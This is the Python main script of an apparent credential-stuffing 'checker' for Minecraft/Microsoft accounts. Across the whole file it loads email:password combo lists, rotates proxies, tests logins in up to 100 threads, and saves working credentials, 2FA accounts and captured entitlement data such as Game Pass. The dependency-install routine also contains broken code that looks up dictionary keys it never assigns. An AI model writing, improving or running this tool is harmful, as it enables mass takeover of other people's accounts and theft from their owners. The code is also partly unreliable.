# -*- coding: utf-8 -*-
# Author: a11_89d (https://t.me/a11_89d)
# Version: 1.1.0

import os
import sys
import platform
import subprocess
import threading
import time
import configparser
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# Rich imports
from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.live import Live
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn

# Local module imports
from mc_check.statistics import Statistics
from mc_check.results_manager import ResultsManager
from mc_check.api_client import APIClient, InvalidCredentialsError, TwoFactorAuthError, APIError, ValidMail
from mc_check.capture_manager import CaptureManager
from mc_check.ui import create_logo, create_credits_panel

# --- Constants ---
BASE_DIR = Path(__file__).parent.resolve()
CONFIG_FILE = BASE_DIR / "config.ini"
REQUIREMENTS_FILE = BASE_DIR / "requirements.txt"

# --- Rich Console ---
console = Console(log_path=False)

def get_os_specific_clear_command():
    os_name = platform.system()
    if os_name == "Windows":
        return "cls"
    elif os_name in ["Linux", "Darwin"]:
        return "clear"
    return None

def clear_screen():
    command = get_os_specific_clear_command()
    if command:
        os.system(command)
    else:
        console.print("\n" * 100)

class MainApp:
    def __init__(self):
        self.config = configparser.ConfigParser(allow_no_value=True)
        self.logo = create_logo()
        self.credits = create_credits_panel()
        self.combos, self.proxies = [], []
        self.combo_file_path = None
        self.proxy_type = "none"
        self.threads = 100
        self.stats = Statistics()
        self.results_manager = None
        self.api_client = None
        self.capture_manager = None
        self.stop_event = threading.Event()

    def _create_default_config(self):
        if CONFIG_FILE.exists(): return
        console.print(f"[yellow]Creating default '{CONFIG_FILE.name}'...[/yellow]")
        config = configparser.ConfigParser(allow_no_value=True)
        config['Settings'] = {'MaxRetries': '5'}
        config['Webhook'] = {'Enabled': 'False', 'WebhookURL': ''}
        config['Captures'] = {'NameChangeAvailability': 'True'}
        try:
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                config.write(f)
            console.print("[bold green]Default config created. Please review and restart.[/bold green]")
        except PermissionError:
            console.print(f"[bold red]Error: Permission denied. Could not create config file at '{CONFIG_FILE}'.[/bold red]")
        sys.exit()

    def _load_config(self):
        self._create_default_config()
        self.config.read(CONFIG_FILE)
        # Validate that necessary sections and keys exist, falling back to defaults.
        if 'Settings' not in self.config: self.config['Settings'] = {}
        if 'Webhook' not in self.config: self.config['Webhook'] = {}
        if 'Captures' not in self.config: self.config['Captures'] = {}


    def _prompt_for_file(self, prompt_text: str) -> Path:
        while True:
            path_str = Prompt.ask(f"[bold cyan]{prompt_text}[/bold cyan]")
            path = Path(path_str.strip().strip("'\""))
            if path.is_file():
                return path
            console.print(f"[bold red]Error: File not found at '{path}'.[/bold red]")

    def _load_file_content(self, file_path: Path, destination_list: list, remove_duplicates: bool = False):
        console.log(f"Loading lines from '{file_path.name}'...")
        lines = []
        try:
            with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
                for line in f:
                    stripped_line = line.strip()
                    if stripped_line:
                        lines.append(stripped_line)
        except Exception as e:
            console.print(f"[bold red]Error reading file {file_path}: {e}[/bold red]")
            return

        if remove_duplicates:
            original_count = len(lines)
            unique_lines = sorted(list(set(lines)))
            if (dupes_removed := original_count - len(unique_lines)) > 0:
                console.log(f"[yellow]Removed {dupes_removed} duplicate(s).[/yellow]")
            destination_list.extend(unique_lines)
        else:
            destination_list.extend(lines)
        console.log(f"[bold green]Loaded {len(destination_list)} lines from '{file_path.name}'.[/bold green]")


    def _get_user_input(self):
        self.threads = IntPrompt.ask("Threads", default=100)
        self.combo_file_path = self._prompt_for_file("Path to combo file")
        self._load_file_content(self.combo_file_path, self.combos, remove_duplicates=True)
        if not self.combos:
            console.print("[bold red]Combo file is empty or could not be read. Exiting.[/bold red]")
            sys.exit()
            
        self.proxy_type = Prompt.ask("Proxy type", choices=["http", "socks4", "socks5", "none"], default="none")
        if self.proxy_type != "none":
            proxy_path = self._prompt_for_file(f"Path to {self.proxy_type.upper()} proxies")
            self._load_file_content(proxy_path, self.proxies)
            if not self.proxies:
                console.print("[bold red]Proxy file is empty or could not be read. Exiting.[/bold red]")
                sys.exit()

    def _update_display_thread(self, progress):
        while not self.stop_event.wait(1): # Use wait with a timeout
            self.stats.calculate_cpm()
            stats_dict = self.stats.get_dict()
            progress.description = (
                f"Checked: {stats_dict['Checked']}/{len(self.combos)} | "
                f"Hits: {stats_dict['Hits']} | Bad: {stats_dict['Bad']} | "
                f"2FA: {stats_dict['2FA']} | CPM: {stats_dict['CPM']}"
            )

    def _worker(self, combo: str):
        if self.stop_event.is_set():
            return

        try:
            email, password = combo.strip().replace(' ', '').split(":", 1)
        except ValueError:
            self.stats.increment("errors")
            return

        try:
            account_data = self.api_client.check_account(email, password)
            
            if 'product_game_pass_ultimate' in account_data['entitlements']: self.stats.increment('xgpu')
            elif 'product_game_pass_pc' in account_data['entitlements']: self.stats.increment('xgp')
            elif 'product_minecraft' not in account_data['entitlements']: self.stats.increment('other')
            
            self.stats.increment("hits")
            self.results_manager.save("Hits", f"{email}:{password}")
            
            captures = self.capture_manager.get_all_captures(account_data)
            capture_str = self.capture_manager.format_capture(account_data, captures)
            self.results_manager.save("Capture", capture_str)

        except InvalidCredentialsError: self.stats.increment("bad")
        except TwoFactorAuthError:
            self.stats.increment("twofa")
            self.results_manager.save("2FA", f"{email}:{password}")
        except ValidMail:
            self.stats.increment("vm")
            self.results_manager.save("Valid_Mail", f"{email}:{password}")
        except APIError: self.stats.increment("errors")
        except Exception: self.stats.increment("errors")
        finally:
            self.stats.increment("checked")
            self.stats.add_cpm()

    def run(self):
        clear_screen()
        console.print(self.logo)
        console.print(self.credits)
        
        try:
            self._load_config()
            self._get_user_input()
            
            self.results_manager = ResultsManager(self.combo_file_path.stem)
            self.api_client = APIClient(self.config, self.proxies, self.proxy_type, self.stats)
            self.capture_manager = CaptureManager(self.config, self.api_client, self.stats)

            progress = Progress(
                SpinnerColumn(), "[progress.description]{task.description}", BarColumn(),
                "[progress.percentage]{task.percentage:>3.0f}%", "•",
                TextColumn("[cyan]{task.completed} of {task.total}"), "•",
                TimeRemainingColumn(), "•", TimeElapsedColumn(),
                console=console, transient=False
            )
            
            with Live(progress, refresh_per_second=10, vertical_overflow="visible") as live:
                update_thread = threading.Thread(target=self._update_display_thread, args=(progress,), daemon=True)
                update_thread.start()

                task_id = progress.add_task("Checking...", total=len(self.combos))
                
                with ThreadPoolExecutor(max_workers=self.threads) as executor:
                    futures = {executor.submit(self._worker, combo) for combo in self.combos}
                    try:
                        for future in as_completed(futures):
                            future.result() # To raise exceptions from workers
                            progress.update(task_id, advance=1)
                    except KeyboardInterrupt:
                        self.stop_event.set()
                        console.print("\n[bold red]Interrupted! Shutting down threads...[/bold red]")
                        # Cancel pending futures
                        for f in futures:
                            if not f.done():
                                f.cancel()
                        # Wait for running tasks to finish (they should exit early via stop_event)
                        executor.shutdown(wait=True)

                self.stop_event.set()
                update_thread.join(timeout=2)
                # Final update to progress to show 100%
                progress.update(task_id, completed=len(self.combos))


            console.print("\n[bold green]Checker has finished.[/bold green]")
            final_table = Table(title="Final Results")
            final_table.add_column("Statistic", style="bold cyan")
            final_table.add_column("Total", style="bold green")
            final_stats = self.stats.get_dict()
            final_stats.pop("CPM", None) # Use pop with default value
            for stat, value in final_stats.items():
                final_table.add_row(stat, str(value))
            console.print(final_table)

        except KeyboardInterrupt:
            # This will catch Ctrl+C during initial setup
            self.stop_event.set()
            console.print("\n[bold red]Interrupted. Exiting gracefully...[/bold red]")
        except Exception as e:
            console.print(f"[bold red]An unexpected error occurred: {e}[/bold red]")
            console.print_exception(show_locals=False)

def install_dependencies():
    try:
        from rich.console import Console
        from rich.prompt import Confirm
    except ImportError:
        print("Rich library is missing. Attempting to install it...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "rich"])
        print("Rich installed. Please run the script again to install other dependencies.")
        sys.exit()

    console = Console()
    if not REQUIREMENTS_FILE.is_file():
        console.print(f"[bold red]'{REQUIREMENTS_FILE.name}' not found. Cannot check dependencies.[/bold red]")
        return

    console.print("[yellow]Checking for required packages...[/yellow]")
    try:
        import pkg_resources
        
        with open(REQUIREMENTS_FILE, 'r') as f:
            lines = f.readlines()

        required = {}
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if 'git+' in line:
                # Heuristic for package name from git URL
                if 'pyCraft' in line: name = 'minecraft'
                else:
                    try:
                        name = line.split('#egg=')[1]
                    except IndexError:
                        console.print(f"[bold yellow]Warning: Cannot determine package name for git dependency: {line}[/bold yellow]")
                        continue
                required[name.lower().replace('_', '-')]
            else:
                # Standard package
                name = line.split('==')[0].split('>=')[0].split('<=')[0].strip()
                required[name.lower().replace('_', '-')]

        installed_packages = {pkg.key for pkg in pkg_resources.working_set}
        missing_packages_names = [name for name in required if name not in installed_packages]
        
        if missing_packages_names:
            missing_packages_install_lines = [required[name] for name in missing_packages_names]
            console.print(f"[bold yellow]Missing packages: {', '.join(missing_packages_names)}[/bold yellow]")
            if Confirm.ask("Install them now?", default=True):
                console.print(f"Installing {len(missing_packages_install_lines)} package(s)...")
                try:
                    # Install one by one to get better error messages
                    for pkg_line in missing_packages_install_lines:
                        console.print(f"--> Installing: {pkg_line}")
                        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg_line], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
                    console.print("[bold green]Dependencies installed successfully![/bold green]")
                except subprocess.CalledProcessError as e:
                    console.print(f"[bold red]Error installing dependencies.[/bold red]")
                    console.print(f"[red]PIP Error: {e.stderr.decode()}[/red]")
                    console.print(f"[red]Failed package: {pkg_line}[/red]")
                    console.print(f"[yellow]Please try installing it manually: pip install \"{pkg_line}\"[/yellow]")
                    sys.exit(1)
            else:
                console.print("[bold red]Cannot proceed without required packages. Exiting.[/bold red]")
                sys.exit()
        else:
            console.print("[bold green]All dependencies are installed.[/bold green]")

    except ImportError:
        console.print("[bold red]`pkg_resources` not found (part of `setuptools`). Please install it manually.[/bold red]")
        sys.exit(1)
    except Exception as e:
        console.print(f"[bold red]An error occurred during dependency check: {e}[/bold red]")
        console.print_exception(show_locals=False)


if __name__ == "__main__":
    install_dependencies()
    app = MainApp()
    app.run()